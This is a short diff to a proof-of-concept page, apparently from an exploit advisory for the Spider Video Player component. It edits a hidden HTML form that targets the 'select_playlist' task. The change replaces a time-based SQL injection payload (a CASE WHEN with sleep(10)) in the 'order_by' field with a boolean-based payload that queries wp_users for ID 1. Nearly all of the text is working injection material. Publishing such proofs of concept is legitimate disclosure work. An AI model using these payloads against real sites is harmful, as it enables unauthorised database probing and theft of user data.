@@ -104,7 +104,7 @@ Proof of concept
          <input type="hidden" name="page_number" value="0" />
          <input type="hidden" name="serch_or_not" value="" />
          <input type="hidden" name="asc_or_desc" value="1" />
-         <input type="hidden" name="order_by" value="(CASE WHEN (SELECT sleep(10)) = 1 THEN id ELSE title END) ASC #" />
+         <input type="hidden" name="order_by" value="(CASE WHEN (SELECT ID from wp_users where ID=1) =1  THEN id ELSE title END) ASC #" />
          <input type="hidden" name="option" value="com_Spider_Video_Player" />
          <input type="hidden" name="task" value="select_playlist" />
          <input type="hidden" name="boxchecked" value="0" />
